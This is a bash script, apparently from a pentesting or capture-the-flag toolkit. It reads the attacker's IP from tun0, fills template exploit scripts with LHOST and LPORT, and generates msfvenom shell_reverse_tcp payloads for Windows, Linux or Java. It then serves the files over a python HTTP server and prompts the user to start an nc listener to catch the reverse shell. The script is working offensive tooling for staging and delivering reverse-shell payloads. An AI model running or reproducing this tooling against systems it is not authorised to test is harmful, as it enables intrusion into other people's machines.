#!/bin/bash
##############################################################################
# This script helps in hosting useful scripts or binaries for exploitation.  #
# What it does is:
#  * show your IP
#  * list available files
#  * create actual scripts from templates (replaces with correct ip)
#  * host webserver on port 80
##############################################################################

# defaults
lport=139
iface='tun0'
http_port=80
msfvenom=''

# parse command line args
while [[ $# -gt 0 ]]; do
  case $1 in
    -h|--help)
      echo "$0 [-p LPORT] [-i IFACE] [-H HTTP_PORT] [-m lsr64.elf,wsr.c,...]" >&2
      exit 0
      ;;
    -p|--port)
      lport="$2"
      shift # past argument
      shift # past value
      ;;
    -i|--iface)
      iface="$2"
      shift # past argument
      shift # past value
      ;;
    -H|--http-port)
      http_port="$2"
      shift # past argument
      shift # past value
      ;;
    -m|--msfvenom)
      msfvenom="$2"
      shift # past argument
      shift # past value
      ;;
    -*|--*)
      echo "Unknown option $1"
      exit 1
      ;;
  esac
done


ip address show "${iface}" 1>/dev/null || exit 1
lhost=$(ip address show $iface | grep -oP '(?<=inet )[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
echo "lhost: $lhost"

this_dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
files="${this_dir}/files"
cd ${this_dir}

###############################################################
#---------------) Poor man's template engine (----------------#
###############################################################
TEMPLATE_SUFFIX='.template'

find . -name "*${TEMPLATE_SUFFIX}" | while read FILENAME
do
    NEW_FILENAME=${files}/$(basename ${FILENAME%.template})
    echo "generating $NEW_FILENAME"
    cp $FILENAME $NEW_FILENAME
    sed -i "s/{{lhost}}/${lhost}/g" $NEW_FILENAME
    sed -i "s/{{lport}}/${lport}/g" $NEW_FILENAME
done


######################################################
#---------------) msfvenom payloads (----------------#
######################################################
if [ -n "$msfvenom" ] && (! [[ -f .last ]] || ! grep -wq ${lhost} .last || ! grep -wq ${lport} .last)
then
    [[ "${msfvenom}" =~ ^w ]] && os='windows/'
    [[ "${msfvenom}" =~ ^l ]] && os='linux/'
    [[ "${msfvenom}" =~ ^j ]] && os='java/'

    [[ "${msfvenom}" =~ .sr ]] && shell='shell_reverse_tcp'

    if [[ "${msfvenom}" =~ 64$ ]]
    then
        arch='x64/'
    else
        [[ "${msfvenom}" =~ ^w ]] && arch=''
        [[ "${msfvenom}" =~ ^l ]] && arch='x86/'
    fi

    format=$(echo $msfvenom | grep -oP '(?<=\.).+$')
    if [ -z "$format" ]; then echo "No format specified"; exit 1; fi

    echo "Generating msfvenom payload..."
    msfvenom -f ${format} -p ${os}${arch}${shell} LHOST=${lhost} LPORT=${lport} -o ${files}/${msfvenom}

    echo ${lhost} > .last
    echo ${lport} >> .last
fi

#########################################################
#---------------) List available files (----------------#
#########################################################
# echo files to get

win_tmp=$(mktemp /tmp/transfers-XXXXXX)
lin_tmp=$(mktemp /tmp/transfers-XXXXXX)
oth_tmp=$(mktemp /tmp/transfers-XXXXXX)

find ${files} -maxdepth 1 \
    -not -type d \
    -printf "%f\n" | while read line
do
    case "$line" in
        *.exe|*.ps1|*.asp|*.aspx|*.bat|*.vbs|wsr*) echo $line >> $win_tmp
               ;;
        *.sh|*.elf|lsr*|pspy*|suid3num*|linux*|unix*) echo $line >> $lin_tmp
               ;;
        *) echo $line >> $oth_tmp
           ;;
    esac
done

nc=$(tput sgr0) # No Color
red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 190)
blue=$(tput setaf 4)
printf $yellow; cat $win_tmp | sort | column; printf $nc
printf $green; cat $lin_tmp | sort | column; printf $nc
printf $blue; cat $oth_tmp | sort | column; printf $nc

rm $win_tmp
rm $lin_tmp
rm $oth_tmp

##########################################################
#---------------) Host python webserver (----------------#
##########################################################
echo "Your IP: ${lhost} - don't forget: $> nc -nlvp ${lport}"
cd ${files} && python3 -m http.server $http_port
